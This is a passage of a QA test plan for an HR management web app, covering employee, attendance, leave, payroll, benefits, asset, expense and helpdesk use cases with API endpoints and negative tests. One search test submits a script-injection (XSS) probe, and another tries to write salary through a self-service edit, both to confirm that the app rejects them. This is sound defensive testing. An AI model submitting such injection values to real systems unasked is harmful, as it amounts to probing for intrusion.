- **URL:** http://localhost:3000/approvals
- **API Endpoint:** `GET /api/v1/approvals/instances/{id}`
- **Playwright Spec:** `frontend/e2e/approvals-workflows.spec.ts`
- **Preconditions:** Approval workflow configured with escalation after 48-hour timeout. Pending
  approval task not acted upon.
- **Test Steps:**
  1. Submit a leave request that creates an approval task for `sumit@nulogic.io`
  2. Do not approve/reject (simulate manager inaction)
  3. Fast-forward time by 48 hours (or trigger escalation job manually via actuator)
  4. Verify: Task escalated to `jagadeesh@nulogic.io` (HR_MANAGER)
  5. Verify: Original approver (`sumit@nulogic.io`) receives "Escalation notice" email/notification
  6. Log in as `jagadeesh@nulogic.io`
  7. Approve the escalated task
- **Expected Result:** Escalation job (`WorkflowEscalationJob` scheduled task) runs. New approval
  task created for escalation target. Original task marked ESCALATED. Notification sent via Kafka
  `nu-aura.notifications` topic.
- **Negative Test:** Trigger escalation API call without SUPER_ADMIN privilege → HTTP 403.
- **Verification:** `GET /api/v1/approvals/instances/{id}` shows escalation history in the audit
  trail.

---

## P1 — NU-HRMS Module Tests

---

### UC-EMP-001 — Create New Employee (Full Cycle)

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN, HR_MANAGER
- **URL:** http://localhost:3000/employees/new
- **API Endpoint:** `POST /api/v1/employees`
- **Playwright Spec:** `frontend/e2e/employee-crud.spec.ts`, `frontend/e2e/employee.spec.ts`
- **Preconditions:** Logged in as `jagadeesh@nulogic.io`. Engineering department exists.
- **Test Steps:**
  1. Navigate to http://localhost:3000/employees/new
  2. Fill personal info: First Name = "Priya", Last Name = "Sharma", Email = "
     priya.sharma@nulogic.io"
  3. Date of Birth: 1995-07-15
  4. Gender: Female
  5. Phone: +91 9876543210
  6. Fill employment info: Department = Engineering, Designation = Software Engineer
  7. Date of Joining: 2026-04-01
  8. Manager: Sumit Kumar
  9. Office: Bangalore HQ
  10. Employment Type: FULL_TIME
  11. CTC: ₹6,00,000/year
  12. Save employee
  13. Verify employee profile page loads
  14. Verify employee appears in employee list
  15. Verify employee receives welcome email (check Kafka notification event)
- **Expected Result:** HTTP 201 with new employee record. Employee ID (EMP-xxx) auto-assigned.
  Profile page accessible. Onboarding checklist automatically generated (if NU-Hire is configured).
- **Negative Test:** Attempt to create employee with duplicate email `saran@nulogic.io` → HTTP 409
  `{ "error": "An employee with this email already exists" }`. Attempt with missing required field (
  date of joining) → HTTP 400 with field-level validation errors.
- **Verification:** `GET /api/v1/employees?email=priya.sharma@nulogic.io` returns the newly created
  employee. DB: `employees.is_active = true`, `employees.tenant_id = <nulogic_tenant_id>`.

---

### UC-EMP-002 — Employee Profile Update

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN (full edit), EMPLOYEE (self-service limited fields)
- **URL:** http://localhost:3000/employees/{id}/edit
- **API Endpoint:** `PUT /api/v1/employees/{id}`
- **Playwright Spec:** `frontend/e2e/employee.spec.ts`
- **Preconditions:** Employee `saran@nulogic.io` exists.
- **Test Steps:**
  1. Log in as `jagadeesh@nulogic.io` (HR_MANAGER)
  2. Navigate to Saran's employee profile
  3. Click "Edit"
  4. Update phone: +91 9999999999
  5. Update emergency contact name
  6. Save — `PUT /api/v1/employees/{id}`
  7. Verify changes reflected on profile
  8. Log in as `saran@nulogic.io` (self-service)
  9. Navigate to http://localhost:3000/me/profile
  10. Employee can update: bank details, emergency contact, address
  11. Employee CANNOT change: salary, designation, department, manager (restricted fields)
- **Expected Result:** HR edits any field. Employee edits only self-service fields. Audit trail
  updated.
- **Negative Test:** Employee attempts `PUT /api/v1/employees/{id}` with `{ "salary": 9999999 }` in
  body → HTTP 403 or field silently ignored (depending on implementation). Verify salary unchanged.
- **Verification:** `GET /api/v1/employees/{id}` reflects updated phone.
  `GET /api/v1/audit/employees/{id}` shows change log.

---

### UC-EMP-003 — Bulk Employee Import via Excel

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/import-export
- **API Endpoint:** `POST /api/v1/employees/import`
- **Playwright Spec:** `frontend/e2e/employee-crud.spec.ts`
- **Preconditions:** Excel template downloaded from system. 5 valid employee rows prepared.
- **Test Steps:**
  1. Navigate to http://localhost:3000/import-export
  2. Download employee import template (Excel)
  3. Fill in 5 rows with valid employee data
  4. Upload the Excel file
  5. Preview import: verify column mapping shown
  6. Click "Import"
  7. Wait for import job to complete
  8. Verify success: "5 employees imported successfully"
  9. Check that 5 new employees appear in employee list
- **Expected Result:** All 5 employees created. Duplicate email in file results in partial import
  with error report (skip duplicates, continue).
- **Negative Test:** Upload Excel with 1 row missing required "Date of Joining" → Import shows
  validation error for that row only. Other valid rows imported. Error report downloadable.
- **Verification:** `GET /api/v1/employees?page=0&size=100` — count increased by 5.

---

### UC-EMP-004 — Employment Change Request (Promotion)

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/employees/{id}/changes
- **API Endpoint:** `POST /api/v1/employees/{id}/changes`
- **Playwright Spec:** `frontend/e2e/employee.spec.ts`
- **Preconditions:** `saran@nulogic.io` at designation "Software Engineer".
- **Test Steps:**
  1. Navigate to Saran's profile → "Employment Changes"
  2. Click "Add Change"
  3. Type: PROMOTION
  4. Effective Date: 2026-04-01
  5. New Designation: Senior Software Engineer
  6. New CTC: ₹7,20,000/year
  7. Save
  8. Verify change reflected on profile from effective date
  9. Verify salary structure updated for next payroll run
- **Expected Result:** Employment change recorded. Profile shows new designation. Payroll component
  updated from effective date. Kafka event on `nu-aura.employee-lifecycle` topic.
- **Negative Test:** Set effective date in the past (before joining date) → HTTP 400
  `{ "error": "Change effective date cannot be before employee joining date" }`.
- **Verification:** `GET /api/v1/employees/{id}` shows updated designation.
  `GET /api/v1/employees/{id}/changes` returns change history.

---

### UC-EMP-005 — Org Chart and Directory Search

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** Any authenticated role
- **URL:** http://localhost:3000/org-chart, http://localhost:3000/team-directory
- **API Endpoint:** `GET /api/v1/organization/org-chart`, `GET /api/v1/employees?search=<term>`
- **Playwright Spec:** `frontend/e2e/org-chart.spec.ts`
- **Preconditions:** Org hierarchy: Fayaz → Sumit → Mani → Saran (as per seed data).
- **Test Steps:**
  1. Navigate to http://localhost:3000/org-chart
  2. Verify tree renders: Fayaz M (root) → Sumit Kumar → Mani S → Saran V
  3. Click on "Sumit Kumar" node
  4. Verify side panel shows: name, designation, department, direct reports count
  5. Navigate to http://localhost:3000/team-directory
  6. Search "Saran" in search box
  7. Verify Saran V appears in results with email, department, designation
  8. Search with partial name "sar" — verify autocomplete or filtered results
- **Expected Result:** Org chart renders full hierarchy. Directory search returns matching
  employees. Search is case-insensitive.
- **Negative Test:** Search with special characters `<script>alert(1)</script>` → No XSS execution,
  empty results or sanitized query. `GET /api/v1/employees?search=%3Cscript%3E` returns empty list,
  not an error.
- **Verification:** `GET /api/v1/organization/org-chart` returns nested tree structure with all
  reporting relationships.

---

### UC-ATT-001 — Check-In and Check-Out

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** EMPLOYEE
- **URL:** http://localhost:3000/attendance
- **API Endpoint:** `POST /api/v1/attendance/check-in`, `POST /api/v1/attendance/check-out`
- **Playwright Spec:** `frontend/e2e/attendance.spec.ts`, `frontend/e2e/attendance-flow.spec.ts`
- **Preconditions:** `saran@nulogic.io` logged in. Today is a working day (not a holiday).
- **Test Steps:**
  1. Navigate to http://localhost:3000/attendance (or http://localhost:3000/me/attendance)
  2. Verify check-in button is active (no check-in today yet)
  3. Click "Check In"
  4. `POST /api/v1/attendance/check-in` with
     `{ "timestamp": "<current_iso_time>", "location": "OFFICE" }`
  5. Button changes to "Check Out" — check-in time displayed
  6. Click "Check Out" (after some time)
  7. `POST /api/v1/attendance/check-out`
  8. Work hours calculated and displayed
  9. Verify attendance record appears in daily view
- **Expected Result:** Check-in and check-out recorded with timestamps. Work hours calculated. Late
  arrival flag set if check-in > shift start time.
- **Negative Test:** Double check-in (click Check In again after already checked in today) → HTTP
  409 `{ "error": "Already checked in today" }`. Check-out without check-in → HTTP 400.
- **Verification:** `GET /api/v1/attendance/today?employeeId=<id>` returns
  `{ "checkIn": "<time>", "checkOut": "<time>", "status": "PRESENT" }`.

---

### UC-ATT-002 — Attendance Regularization Request

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** EMPLOYEE (submit), MANAGER (approve)
- **URL:** http://localhost:3000/attendance/regularization
- **API Endpoint:** `POST /api/v1/attendance/regularization`
- **Playwright Spec:** `frontend/e2e/attendance.spec.ts`
- **Preconditions:** Employee has an ABSENT or LATE attendance record on 2026-03-28.
- **Test Steps:**
  1. Log in as `saran@nulogic.io`
  2. Navigate to attendance calendar
  3. Click on 2026-03-28 (marked ABSENT)
  4. Click "Request Regularization"
  5. Enter actual check-in time: 09:00, check-out: 18:00
  6. Reason: "Forgot to mark attendance — worked from office"
  7. Submit
  8. Manager approves via approval inbox
  9. Attendance record for 2026-03-28 updated to PRESENT
- **Expected Result:** Regularization request created. On approval, attendance record corrected.
  Payroll impact: no LOP deduction for that day.
- **Negative Test:** Request regularization for a date more than 30 days ago (policy limit) → HTTP
  400 `{ "error": "Regularization not allowed for dates older than 30 days" }`.
- **Verification:** `GET /api/v1/attendance?employeeId=<id>&date=2026-03-28` shows status PRESENT
  after approval.

---

### UC-ATT-003 — Shift Assignment

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN, MANAGER
- **URL:** http://localhost:3000/shifts
- **API Endpoint:** `POST /api/v1/shifts/assignments`
- **Playwright Spec:** `frontend/e2e/shifts.spec.ts`
- **Preconditions:** Shift policy "Day Shift" (09:00-18:00) and "Night Shift" (21:00-06:00) exist.
- **Test Steps:**
  1. Navigate to http://localhost:3000/shifts
  2. Click "Assign Shift"
  3. Select employee: `saran@nulogic.io`
  4. Select shift: "Day Shift"
  5. Effective from: 2026-04-01
  6. Save
  7. Verify Saran's attendance view shows correct shift timing
  8. Late arrival now calculated relative to 09:00 start
- **Expected Result:** Shift assigned. Attendance rules (late, early exit, overtime) computed
  against shift timings.
- **Negative Test:** Assign an employee to two overlapping shifts → HTTP 409
  `{ "error": "Employee already has an active shift for this period" }`.
- **Verification:** `GET /api/v1/shifts/assignments?employeeId=<id>` returns active shift
  assignment.

---

### UC-LEAVE-001 — Apply Leave (Annual Leave)

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** EMPLOYEE
- **URL:** http://localhost:3000/leave/apply
- **API Endpoint:** `POST /api/v1/leave/requests`
- **Playwright Spec:** `frontend/e2e/leave.spec.ts`, `frontend/e2e/leave-flow.spec.ts`
- **Preconditions:** `saran@nulogic.io` has 12 AL days. Next week is not a public holiday.
- **Test Steps:**
  1. Navigate to http://localhost:3000/leave/apply
  2. Select leave type: Annual Leave
  3. Select start date: 2026-04-14 (Monday)
  4. Select end date: 2026-04-15 (Tuesday)
  5. Day type: Full Day for both
  6. Enter reason: "Personal travel"
  7. Verify balance preview: "Available: 12 days, Requested: 2 days, Remaining: 10 days"
  8. Click Submit
  9. Verify success notification
  10. Verify leave appears in "My Leave Requests" with status PENDING
  11. Verify available balance shows "On Hold: 2 days"
- **Expected Result:** Leave request created. Balance on hold until approved. Manager notification
  sent.
- **Negative Test:** Apply for 15 days when only 12 AL available → Frontend validation error OR HTTP
  400 `{ "error": "Insufficient leave balance. Available: 12, Requested: 15" }`. Apply for a date
  that falls on a public holiday → System auto-excludes holiday and recalculates working days.
- **Verification:** `GET /api/v1/leave/balances?employeeId=<id>` shows
  `{ "annualLeave": { "available": 12, "onHold": 2 } }`.

---

### UC-LEAVE-002 — Leave Balance Carry-Forward

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/leave/admin/carry-forward
- **API Endpoint:** `POST /api/v1/leave/admin/carry-forward`
- **Playwright Spec:** `frontend/e2e/leave.spec.ts`
- **Preconditions:** Year-end. Employees have unused AL. Policy: max 5 days carry-forward.
- **Test Steps:**
  1. Log in as `jagadeesh@nulogic.io`
  2. Navigate to leave admin panel
  3. Click "Process Year-End Carry-Forward"
  4. Preview: shows each employee's unused AL and capped carry-forward
  5. Confirm and process
  6. Verify new-year balances: employees with 8+ unused AL get 5 days carried forward; employees
     with 3 unused AL get 3 days
- **Expected Result:** All employees' new-year AL balance = carry-forward amount + fresh
  allocation (15 days). Excess days lapsed.
- **Negative Test:** Run carry-forward twice for the same year → HTTP 409
  `{ "error": "Carry-forward already processed for this period" }`.
- **Verification:** `GET /api/v1/leave/balances` returns new-year balances for all employees.

---

### UC-LEAVE-003 — Leave Encashment

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** EMPLOYEE (request), HR_ADMIN (process)
- **URL:** http://localhost:3000/leave/encashment
- **API Endpoint:** `POST /api/v1/leave/encashment`
- **Playwright Spec:** `frontend/e2e/leave.spec.ts`
- **Preconditions:** Employee has 5+ encashable AL days. Encashment policy active.
- **Test Steps:**
  1. Log in as `saran@nulogic.io`
  2. Navigate to http://localhost:3000/leave/encashment
  3. Select number of days to encash: 3
  4. View preview: 3 × (Monthly Basic / 26) = encashment amount
  5. Submit encashment request
  6. HR Admin approves and processes
  7. Verify encashment amount added to payroll for current month
  8. Verify AL balance reduced by 3
- **Expected Result:** Encashment amount = 3 × (Basic/26). Added to payroll as separate earning. AL
  balance reduced.
- **Negative Test:** Request encashment of Sick Leave (non-encashable type) → HTTP 400
  `{ "error": "Sick Leave is not encashable" }`.
- **Verification:** Leave balance shows AL reduced by 3. Payroll run includes encashment component.

---

### UC-STAT-001 — PF Calculation Verification

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/statutory
- **API Endpoint:** `GET /api/v1/statutory/pf-summary`
- **Playwright Spec:** `frontend/e2e/payroll-statutory.spec.ts`, `frontend/e2e/tax-lwf.spec.ts`
- **Preconditions:** Payroll run processed. All employees have PF enabled.
- **Test Steps:**
  1. Navigate to http://localhost:3000/statutory (or http://localhost:3000/statutory-filings)
  2. Select month: March 2026
  3. View PF summary
  4. For `saran@nulogic.io` (Basic = ₹20,000): Employee PF = MIN(20000 × 0.12, 1800) = ₹1,800
  5. Employer PF contribution: ₹1,800 (EPS + EPF split per PF rules)
  6. Verify ECR (Electronic Challan cum Return) export available
  7. Download ECR file
  8. Verify ECR format matches EPFO specification
- **Expected Result:** PF correctly calculated at 12% of basic (capped at ₹1,800 employee
  contribution). ECR downloadable in correct format.
- **Negative Test:** Process PF for an employee with basic > ₹15,000 who voluntarily contributes at
  higher rate → Contribution uses actual basic (no cap) when VPF enabled.
- **Verification:** `GET /api/v1/statutory/pf-summary?month=2026-03` returns employee-wise PF
  breakdown.

---

### UC-STAT-002 — TDS Declaration and Form 16

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** EMPLOYEE (submit declaration), HR_ADMIN (generate Form 16)
- **URL:** http://localhost:3000/tax, http://localhost:3000/statutory-filings
- **API Endpoint:** `POST /api/v1/tax/declarations`, `GET /api/v1/statutory/form16/{employeeId}`
- **Playwright Spec:** `frontend/e2e/payroll-statutory.spec.ts`
- **Preconditions:** Financial year in progress. `saran@nulogic.io` has not submitted investment
  declaration.
- **Test Steps:**
  1. Log in as `saran@nulogic.io`
  2. Navigate to http://localhost:3000/tax
  3. Submit investment declaration: Section 80C = ₹1,50,000 (PF + LIC + ELSS), Section 80D =
     ₹25,000 (health insurance)
  4. Save declaration
  5. Verify projected TDS recalculated for remaining months
  6. At year-end: Log in as `jagadeesh@nulogic.io`
  7. Navigate to statutory filings
  8. Generate Form 16 for `saran@nulogic.io`
  9. Download PDF Form 16
  10. Verify Form 16 contains: employer TAN, employee PAN, gross salary, deductions, TDS deducted
- **Expected Result:** TDS recalculated after declaration. Form 16 Part A (TDS) + Part B (salary
  breakdown) generated correctly.
- **Negative Test:** Submit declaration with 80C > ₹1,50,000 → System caps at ₹1,50,000 or
  validation error "Maximum 80C deduction is ₹1,50,000".
- **Verification:** `GET /api/v1/tax/declarations?employeeId=<id>` returns submitted declaration.
  TDS component in payslip updated.

---

### UC-STAT-003 — LWF Deduction

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/lwf
- **API Endpoint:** `GET /api/v1/statutory/lwf-summary`
- **Playwright Spec:** `frontend/e2e/tax-lwf.spec.ts`
- **Preconditions:** Employees in Karnataka (BLR office) and Maharashtra (MUM office).
- **Test Steps:**
  1. Navigate to http://localhost:3000/lwf
  2. View LWF deductions for June 2026 (bi-annual deduction month)
  3. Karnataka employees: Employee ₹20, Employer ₹40 (slab: 2× frequency)
  4. Maharashtra employees: Employee ₹6/₹12/₹18 based on salary slab
  5. Verify LWF included in June payroll run
- **Expected Result:** LWF applied in correct months (state-specific). Correct amounts per state
  slab.
- **Negative Test:** LWF deduction in non-LWF month (e.g., April for Karnataka) → No LWF deduction
  in payslip.
- **Verification:** Payslip for June shows LWF deduction line item. Other months do not.

---

### UC-BEN-001 — Benefit Plan Enrollment

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** EMPLOYEE (self-enroll), HR_ADMIN (admin enroll)
- **URL:** http://localhost:3000/benefits
- **API Endpoint:** `POST /api/v1/benefits/enrollments`
- **Playwright Spec:** `frontend/e2e/benefits.spec.ts`
- **Preconditions:** Benefit plan "Group Health Insurance — Corporate" active. `saran@nulogic.io`
  not yet enrolled.
- **Test Steps:**
  1. Log in as `saran@nulogic.io`
  2. Navigate to http://localhost:3000/benefits
  3. View available plans
  4. Click "Enroll" on Group Health Insurance plan
  5. Select coverage: Employee + Spouse
  6. Enter dependent info: spouse name, date of birth
  7. Submit enrollment — `POST /api/v1/benefits/enrollments`
  8. Verify enrollment confirmation
  9. Verify monthly premium appears as deduction in next payroll run
- **Expected Result:** Enrollment created. Dependent record saved. Premium deduction scheduled for
  next payroll.
- **Negative Test:** Employee attempts to enroll in a plan they are not eligible for (e.g.,
  management-only plan) → HTTP 403 `{ "error": "You are not eligible for this benefit plan" }`.
- **Verification:** `GET /api/v1/benefits/enrollments?employeeId=<id>` returns active enrollment
  with dependents.

---

### UC-BEN-002 — New Hire Auto-Enrollment

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN (triggers on joining)
- **URL:** http://localhost:3000/benefits/admin
- **API Endpoint:** `POST /api/v1/benefits/enrollments/auto-enroll`
- **Playwright Spec:** `frontend/e2e/benefits.spec.ts`
- **Preconditions:** Auto-enrollment policy configured for "Group Health Insurance" (mandatory, all
  employees). New employee "Priya Sharma" joining date today.
- **Test Steps:**
  1. Navigate to Priya Sharma's employee profile
  2. Verify auto-enrollment triggered on joining date
  3. Check benefits panel: "Group Health Insurance" shows ACTIVE status
  4. No manual action required by employee or HR
- **Expected Result:** Auto-enrollment fires via `EmployeeLifecycleEvent` Kafka consumer. Benefit
  activated on joining date.
- **Negative Test:** Auto-enrollment fails for an employee missing mandatory dependent info → Alert
  raised to HR with pending action item.
- **Verification:** `GET /api/v1/benefits/enrollments?employeeId=<new_employee_id>` shows
  auto-enrolled plan.

---

### UC-ASSET-001 — Asset Assignment to Employee

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN, IT Admin
- **URL:** http://localhost:3000/assets
- **API Endpoint:** `POST /api/v1/assets`, `POST /api/v1/assets/{id}/assign`
- **Playwright Spec:** `frontend/e2e/assets.spec.ts`, `frontend/e2e/asset-flow.spec.ts`
- **Preconditions:** Logged in as `jagadeesh@nulogic.io`. Asset "MacBook Pro 14" in AVAILABLE
  status.
- **Test Steps:**
  1. Navigate to http://localhost:3000/assets
  2. Find "MacBook Pro 14" (asset tag: ASSET-001)
  3. Click "Assign"
  4. Select employee: Saran V
  5. Assignment date: 2026-04-01
  6. Condition: GOOD
  7. Save — `POST /api/v1/assets/{id}/assign`
  8. Verify asset status changes from AVAILABLE → ASSIGNED
  9. Verify asset appears in Saran's profile under "Assets"
  10. Verify acknowledgement request sent to Saran
- **Expected Result:** Asset assigned. Status updated. Audit trail entry created. Employee
  acknowledgement pending.
- **Negative Test:** Attempt to assign an already ASSIGNED asset to another employee → HTTP 409
  `{ "error": "Asset is already assigned to another employee" }`.
- **Verification:** `GET /api/v1/assets/{id}` returns
  `{ "status": "ASSIGNED", "assignedTo": "<saran_employee_id>" }`.

---

### UC-ASSET-002 — Asset Return on Exit

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/assets
- **API Endpoint:** `POST /api/v1/assets/{id}/return`
- **Playwright Spec:** `frontend/e2e/asset-flow.spec.ts`
- **Preconditions:** Asset "MacBook Pro 14" assigned to `saran@nulogic.io`. Employee exiting.
- **Test Steps:**
  1. Navigate to Saran's asset list
  2. Click "Return" on MacBook Pro 14
  3. Set return date: 2026-04-30
  4. Condition on return: GOOD (no damage)
  5. Notes: "Returned in working condition"
  6. Submit
  7. Asset status → AVAILABLE
  8. Asset history shows full lifecycle: assigned → returned
- **Expected Result:** Return recorded. Asset available for reassignment. FnF settlement can
  proceed.
- **Negative Test:** Mark returned asset as DAMAGED → Depreciation/repair cost logged against
  employee record for FnF settlement deduction.
- **Verification:** `GET /api/v1/assets/{id}` returns
  `{ "status": "AVAILABLE", "condition": "GOOD" }`.

---

### UC-EXP-001 — Submit Expense Claim

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** EMPLOYEE
- **URL:** http://localhost:3000/expenses/new
- **API Endpoint:** `POST /api/v1/expenses`
- **Playwright Spec:** `frontend/e2e/expenses.spec.ts`, `frontend/e2e/expense-flow.spec.ts`
- **Preconditions:** Expense categories configured (Travel, Meals, Accommodation, Office Supplies).
- **Test Steps:**
  1. Navigate to http://localhost:3000/expenses/new
  2. Create claim title: "Mumbai Client Visit - April 2026"
  3. Add line item 1: Travel, ₹2,500, Date: 2026-04-05, Description: "Flight BLR-MUM"
  4. Add line item 2: Accommodation, ₹3,500, Date: 2026-04-05, Description: "Hotel 1 night"
  5. Add line item 3: Meals, ₹800, Date: 2026-04-05
  6. Upload receipts (JPG/PNG) for each line item
  7. Total: ₹6,800 — preview shown
  8. Submit claim
  9. Verify claim created with status PENDING
- **Expected Result:** Expense claim created. All line items stored. Receipt files uploaded to
  Google Drive storage.
- **Negative Test:** Upload a receipt file > 5MB → HTTP 413
  `{ "error": "File size exceeds maximum limit of 5MB" }`. Submit claim without any line items →
  HTTP 400 `{ "error": "At least one expense line item is required" }`.
- **Verification:** `GET /api/v1/expenses?employeeId=<id>` returns the claim. Receipt URLs stored in
  DB.

---

### UC-LOAN-001 — Apply for Employee Loan

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** EMPLOYEE (apply), HR_ADMIN (approve, disburse)
- **URL:** http://localhost:3000/loans
- **API Endpoint:** `POST /api/v1/loans`, `POST /api/v1/loans/{id}/disburse`
- **Playwright Spec:** `frontend/e2e/loans.spec.ts`
- **Preconditions:** Loan policy: max ₹1,00,000, max 12 EMIs, eligibility: > 6 months tenure.
- **Test Steps:**
  1. Log in as `saran@nulogic.io`
  2. Navigate to http://localhost:3000/loans
  3. Click "Apply for Loan"
  4. Amount: ₹50,000
  5. Tenure: 10 months
  6. Reason: "Medical emergency"
  7. Submit — `POST /api/v1/loans`
  8. HR Admin approves via approval workflow
  9. HR Admin clicks "Disburse" — `POST /api/v1/loans/{id}/disburse`
  10. Verify EMI schedule generated: ₹5,000/month for 10 months
  11. Verify next payroll run deducts first EMI
- **Expected Result:** Loan approved. EMI schedule: ₹50,000 / 10 = ₹5,000/month. EMI appears as
  payroll deduction from next run.
- **Negative Test:** Employee with only 3 months tenure applies → HTTP 400
  `{ "error": "Loan eligibility requires minimum 6 months of service" }`. Apply for ₹2,00,000 (
  exceeds policy) → Validation error.
- **Verification:** `GET /api/v1/loans/{id}` returns loan with EMI schedule.
  `GET /api/v1/loans/{id}/schedule` returns monthly breakdown.

---

### UC-TRAVEL-001 — Travel Request and Approval

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** EMPLOYEE (request), MANAGER (approve)
- **URL:** http://localhost:3000/travel
- **API Endpoint:** `POST /api/v1/travel/requests`
- **Playwright Spec:** `frontend/e2e/travel.spec.ts`
- **Preconditions:** Travel policy configured. `saran@nulogic.io` eligible for domestic travel.
- **Test Steps:**
  1. Navigate to http://localhost:3000/travel
  2. Click "New Travel Request"
  3. Destination: Mumbai
  4. Purpose: Client meeting
  5. Travel dates: 2026-04-20 to 2026-04-21
  6. Mode: Flight (economy)
  7. Estimated cost: ₹8,000
  8. Add itinerary details
  9. Submit — approval chain triggered
  10. Manager approves
  11. Travel desk books tickets
  12. Employee views booking confirmation in travel portal
- **Expected Result:** Travel request flows through approval. On approval, travel desk notified. Per
  diem calculated per company policy.
- **Negative Test:** Submit travel request for international destination without special approval →
  HTTP 400 or pending L3 approval flag set.
- **Verification:** `GET /api/v1/travel/requests/{id}` returns request with status and itinerary.

---

### UC-CONTRACT-001 — Create and E-Sign Employment Contract

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN (create), EMPLOYEE (sign)
- **URL:** http://localhost:3000/contracts
- **API Endpoint:** `POST /api/v1/contracts`, `POST /api/v1/contracts/{id}/send-for-signature`
- **Playwright Spec:** `frontend/e2e/hire-to-onboard.spec.ts`
- **Preconditions:** Contract template "Standard Employment Contract" exists.
  `priya.sharma@nulogic.io` is a new joiner.
- **Test Steps:**
  1. Navigate to http://localhost:3000/contracts
  2. Click "Create Contract"
  3. Select template: Standard Employment Contract
  4. Select employee: Priya Sharma
  5. Fill variables: salary, start date, designation
  6. Preview generated contract
  7. Click "Send for E-Signature" — `POST /api/v1/contracts/{id}/send-for-signature`
  8. DocuSign envelope created (or mock e-sign in dev)
  9. Employee receives email with signing link
  10. Employee navigates to sign page: http://localhost:3000/sign/{token}
  11. Employee signs digitally
  12. Contract status → SIGNED
  13. Signed PDF stored and downloadable
- **Expected Result:** Contract generated from template. E-signature flow completes. Signed contract
  PDF archived. Renewal reminder scheduled (if fixed-term).
- **Negative Test:** Attempt to send for signature a contract with missing mandatory clauses → HTTP
  400 `{ "error": "Contract template validation failed: missing CONFIDENTIALITY clause" }`.
- **Verification:** `GET /api/v1/contracts/{id}` returns
  `{ "status": "SIGNED", "signedAt": "<timestamp>" }`.

---

### UC-LETTER-001 — Generate Experience Letter

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/letters
- **API Endpoint:** `POST /api/v1/letters/generate`
- **Playwright Spec:** `frontend/e2e/letters.spec.ts`
- **Preconditions:** Letter template "Experience Letter" configured with placeholders:
  `{{employee_name}}`, `{{designation}}`, `{{department}}`, `{{date_of_joining}}`,
  `{{last_working_date}}`.
- **Test Steps:**
  1. Navigate to http://localhost:3000/letters
  2. Click "Generate Letter"
  3. Select type: Experience Letter
  4. Select employee: Saran V
  5. Preview letter — verify all placeholders replaced with actual values
  6. Click "Generate PDF"
  7. `POST /api/v1/letters/generate` with `{ "type": "EXPERIENCE_LETTER", "employeeId": "<id>" }`
  8. PDF downloaded
  9. Verify letter contains: name, designation, department, date of joining, company letterhead
- **Expected Result:** PDF generated via OpenPDF. All placeholders replaced. Company
  letterhead/signature applied.
- **Negative Test:** Generate letter for an employee with missing date of joining data → HTTP 400
  with specific field error OR fallback to manual entry prompt.
- **Verification:** HTTP 200 with `Content-Type: application/pdf`. Letter downloadable.

---

### UC-DEPT-001 — Department Hierarchy Management

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN, TENANT_ADMIN
- **URL:** http://localhost:3000/departments
- **API Endpoint:** `POST /api/v1/organization/departments`,
  `PUT /api/v1/organization/departments/{id}`
- **Playwright Spec:** `frontend/e2e/departments.spec.ts`
- **Preconditions:** Logged in as `jagadeesh@nulogic.io`.
- **Test Steps:**
  1. Navigate to http://localhost:3000/departments
  2. Click "Add Department"
  3. Name: "Product Management"
  4. Parent: Engineering
  5. Department Head: Sumit Kumar
  6. Save
  7. Verify department appears in tree under Engineering
  8. Move 2 employees to Product Management
  9. Verify org chart updated
- **Expected Result:** Department created with correct parent. Employees moved. Org chart reflects
  new structure.
- **Negative Test:** Delete a department that has active employees → HTTP 400
  `{ "error": "Cannot delete department with active employees. Move employees first." }`.
- **Verification:** `GET /api/v1/organization/departments` returns new department in hierarchy.

---

### UC-HELP-001 — Create and Resolve Helpdesk Ticket

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** EMPLOYEE (create), HR_ADMIN (resolve)
- **URL:** http://localhost:3000/helpdesk
- **API Endpoint:** `POST /api/v1/helpdesk/tickets`
- **Playwright Spec:** `frontend/e2e/helpdesk.spec.ts`
- **Preconditions:** Helpdesk categories configured. SLA policy: P1 = 4 hours, P2 = 8 hours, P3 = 24
  hours.
- **Test Steps:**
  1. Log in as `saran@nulogic.io`
  2. Navigate to http://localhost:3000/helpdesk
  3. Click "Raise Ticket"
  4. Category: Payroll Query
  5. Priority: P2
  6. Subject: "March payslip shows incorrect HRA"
  7. Description: Detailed description with expected vs actual values
  8. Submit
  9. Log in as `jagadeesh@nulogic.io`
  10. Assign ticket to self
  11. Add comment: "Investigating"
  12. Resolve: "HRA corrected in April payroll. March payslip will be revised."
  13. Close ticket
  14. Employee receives resolution notification
- **Expected Result:** Ticket created, assigned, resolved. SLA tracked. Resolution notification
  sent.
- **Negative Test:** SLA breach: P2 ticket not resolved in 8 hours → SLA escalation triggered, HR
  Manager notified.
